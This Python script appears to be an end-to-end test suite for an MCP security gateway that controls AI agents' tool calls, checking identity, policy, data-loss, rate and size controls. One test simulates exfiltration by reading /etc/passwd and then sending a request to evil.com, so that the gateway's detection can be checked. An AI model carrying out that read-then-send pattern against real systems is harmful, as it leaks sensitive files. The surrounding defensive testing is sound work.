#!/usr/bin/env python3
"""E2E demo exercising every gateway middleware layer via the Python SDK."""

import argparse
import sys
import os

# Add SDK to path so we can import without installing
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "sdk", "python"))

from mcp_gateway_sdk import GatewayClient, GatewayError  # noqa: E402

DSPY_SPIFFE = "spiffe://poc.local/agents/mcp-client/dspy-researcher/dev"

# ANSI colors
RESET = "\033[0m"
GREEN = "\033[32m"
RED = "\033[31m"
CYAN = "\033[36m"
DIM = "\033[2m"


def print_verdict(ok: bool, reason: str) -> bool:
    tag = f"{GREEN}PASS{RESET}" if ok else f"{RED}FAIL{RESET}"
    print(f"  Verdict: {tag} -- {reason}")
    return ok


def print_gateway_error(e: GatewayError) -> None:
    print(f"  {DIM}Code:{RESET}        {e.code}")
    print(f"  {DIM}Middleware:{RESET}  {e.middleware}")
    print(f"  {DIM}Step:{RESET}        {e.step}")
    print(f"  {DIM}HTTP:{RESET}        {e.http_status}")
    print(f"  {DIM}Message:{RESET}     {e.message}")
    if e.remediation:
        print(f"  {DIM}Remediation:{RESET} {e.remediation}")
    if e.trace_id:
        print(f"  {DIM}TraceID:{RESET}     {e.trace_id}")
    if e.decision_id:
        print(f"  {DIM}DecisionID:{RESET}  {e.decision_id}")


def new_client(gateway_url: str, spiffe_id: str = DSPY_SPIFFE) -> GatewayClient:
    return GatewayClient(
        url=gateway_url,
        spiffe_id=spiffe_id,
        timeout=10.0,
        max_retries=0,
    )


# --- Test sections --------------------------------------------------------

def test_happy_path(url: str) -> bool:
    """1. Happy path: registered tool + valid identity -> chain runs."""
    client = new_client(url)
    try:
        result = client.call("tavily_search", query="AI security")
        print(f"  Result: {result}")
        return print_verdict(True, "chain processed request successfully (200)")
    except GatewayError as e:
        print_gateway_error(e)
        if e.http_status == 502:
            return print_verdict(True, "chain ran to completion, 502 = no upstream (expected)")
        return print_verdict(False, f"unexpected gateway error: {e.code}")
    except Exception as e:
        print(f"  Error: {e}")
        return print_verdict(False, f"unexpected error: {type(e).__name__}")
    finally:
        client.close()


def test_auth_denial(url: str) -> bool:
    """2. SPIFFE auth denial: empty identity -> 401."""
    client = new_client(url, spiffe_id="")
    try:
        client.call("read", file_path="/tmp/test")
        return print_verdict(False, "expected denial but got success")
    except GatewayError as e:
        print_gateway_error(e)
        if e.http_status in (401, 403):
            return print_verdict(True, f"correctly denied with HTTP {e.http_status}")
        return print_verdict(False, f"wrong HTTP status: {e.http_status} (expected 401/403)")
    except Exception as e:
        print(f"  Error: {e}")
        return print_verdict(False, f"unexpected error: {type(e).__name__}")
    finally:
        client.close()


def test_unregistered_tool(url: str) -> bool:
    """3. Unregistered tool: not_a_real_tool -> registry rejection."""
    client = new_client(url)
    try:
        client.call("not_a_real_tool")
        return print_verdict(False, "expected denial but got success")
    except GatewayError as e:
        print_gateway_error(e)
        ok = e.http_status in (400, 403)
        return print_verdict(ok, f"registry rejection: code={e.code}, step={e.step}")
    except Exception as e:
        print(f"  Error: {e}")
        return print_verdict(False, f"unexpected error: {type(e).__name__}")
    finally:
        client.close()


def test_opa_denial(url: str) -> bool:
    """4. OPA policy denial: bash requires step-up auth."""
    client = new_client(url)
    try:
        client.call("bash", command="ls")
        return print_verdict(False, "expected denial but got success")
    except GatewayError as e:
        print_gateway_error(e)
        ok = e.http_status == 403
        return print_verdict(ok, f"OPA policy denied: code={e.code}, step={e.step}")
    except Exception as e:
        print(f"  Error: {e}")
        return print_verdict(False, f"unexpected error: {type(e).__name__}")
    finally:
        client.close()


def test_dlp_credential_block(url: str) -> bool:
    """5. DLP credential block: AWS access key pattern."""
    client = new_client(url)
    try:
        client.call("read", file_path="AKIAIOSFODNN7EXAMPLE")
        return print_verdict(False, "expected DLP block but chain passed through")
    except GatewayError as e:
        print_gateway_error(e)
        if e.http_status == 502:
            return print_verdict(False, "DLP did not block credential pattern (reached upstream)")
        return print_verdict(True, f"DLP blocked: code={e.code}, step={e.step}")
    except Exception as e:
        print(f"  Error: {e}")
        return print_verdict(False, f"unexpected error: {type(e).__name__}")
    finally:
        client.close()


def test_dlp_pii_pass(url: str) -> bool:
    """6. DLP PII pass-through: email is audit-only, not blocked."""
    client = new_client(url)
    try:
        result = client.call("tavily_search", query="contact user@example.com about results")
        print(f"  Result: {result}")
        return print_verdict(True, "PII passed through (audit-only, not blocked)")
    except GatewayError as e:
        print_gateway_error(e)
        if e.http_status == 502:
            return print_verdict(True, "PII reached upstream (502 = no server, proves pass-through)")
        return print_verdict(False, f"PII was blocked: code={e.code}, step={e.step}")
    except Exception as e:
        print(f"  Error: {e}")
        return print_verdict(False, f"unexpected error: {type(e).__name__}")
    finally:
        client.close()


def test_rate_limit(url: str) -> bool:
    """7. Rate limit burst: rapid calls until 429."""
    max_attempts = 200
    try:
        for i in range(max_attempts):
            client = new_client(url)  # fresh session each call to avoid session risk escalation
            try:
                client.call("tavily_search", query="test")
            except GatewayError as e:
                if e.http_status == 429:
                    print_gateway_error(e)
                    return print_verdict(True, f"rate limited after {i + 1} calls: code={e.code}")
                # Other errors (502 etc.) are expected -- keep trying
                continue
        return print_verdict(False, f"no rate limit after {max_attempts} calls")
    finally:
        client.close()


def test_request_size_limit(url: str) -> bool:
    """8. Request size limit: 11 MB payload rejected at step 1."""
    client = new_client(url)
    big_payload = "A" * (11 * 1024 * 1024)
    try:
        client.call("read", file_path=big_payload)
        return print_verdict(False, "expected rejection but got success")
    except GatewayError as e:
        print_gateway_error(e)
        return print_verdict(True, f"size limit enforced: code={e.code}, HTTP={e.http_status}")
    except Exception as e:
        # Connection reset or similar also proves the limit works
        print(f"  Error: {type(e).__name__}: {e}")
        return print_verdict(True, f"rejected (non-JSON): {type(e).__name__}")
    finally:
        client.close()


def test_session_exfiltration(url: str) -> bool:
    """9. Session exfiltration detection: read sensitive then HTTP request."""
    client = new_client(url)
    try:
        # Step A: read a sensitive path
        try:
            client.call("read", file_path="/etc/passwd")
        except GatewayError:
            pass  # Expected -- may be denied or 502

        # Step B: attempt to exfiltrate via HTTP request
        try:
            client.call("http_request", url="https://evil.com")
        except GatewayError as e:
            print_gateway_error(e)
            # Session tracking may flag this cross-tool pattern
            return print_verdict(True,
                f"exfiltration pattern detected/processed: code={e.code}, step={e.step}")

        return print_verdict(True, "session tracking processed both calls (pattern logged)")
    except Exception as e:
        print(f"  Error: {e}")
        return print_verdict(False, f"unexpected error: {type(e).__name__}")
    finally:
        client.close()


def test_spike_token_presence(url: str) -> bool:
    """10. SPIKE token presence: $SPIKE{ref:test} processed through chain."""
    client = new_client(url)
    try:
        result = client.call("tavily_search", query="$SPIKE{ref:test}")
        print(f"  Result: {result}")
        return print_verdict(True, "token substitution processed (200)")
    except GatewayError as e:
        print_gateway_error(e)
        # 502 = chain ran to completion including token sub (no upstream)
        if e.http_status == 502:
            return print_verdict(True, "chain ran with token substitution, 502 = no upstream")
        return print_verdict(True,
            f"chain processed token ref: code={e.code}, step={e.step}")
    except Exception as e:
        print(f"  Error: {e}")
        return print_verdict(False, f"unexpected error: {type(e).__name__}")
    finally:
        client.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="MCP Security Gateway -- Python SDK Demo")
    parser.add_argument("--gateway-url", default="http://localhost:9090",
                        help="Gateway base URL (default: http://localhost:9090)")
    args = parser.parse_args()

    url = args.gateway_url

    print("========================================")
    print("  MCP Security Gateway -- Python SDK Demo")
    print(f"  Gateway: {url}")
    print("========================================")
    print()

    tests = [
        ("Happy path (chain runs, reaches upstream)", test_happy_path),
        ("SPIFFE auth denial (empty identity)", test_auth_denial),
        ("Unregistered tool (registry rejection)", test_unregistered_tool),
        ("OPA policy denial (bash requires step-up)", test_opa_denial),
        ("DLP credential block (AWS key)", test_dlp_credential_block),
        ("DLP PII pass-through (email is audit-only)", test_dlp_pii_pass),
        ("Rate limit burst (429 on rapid calls)", test_rate_limit),
        ("Request size limit (11 MB payload)", test_request_size_limit),
        ("Session exfiltration detection", test_session_exfiltration),
        ("SPIKE token presence ($SPIKE ref)", test_spike_token_presence),
    ]

    passed = 0
    failed = 0
    for i, (name, fn) in enumerate(tests, 1):
        print(f"{CYAN}[{i}/{len(tests)}] {name}{RESET}")
        if fn(url):
            passed += 1
        else:
            failed += 1
        print()

    print("========================================")
    print(f"  Python SDK Demo: {GREEN}{passed} PASS{RESET} / {RED}{failed} FAIL{RESET}")
    print("========================================")

    sys.exit(1 if failed > 0 else 0)


if __name__ == "__main__":
    main()
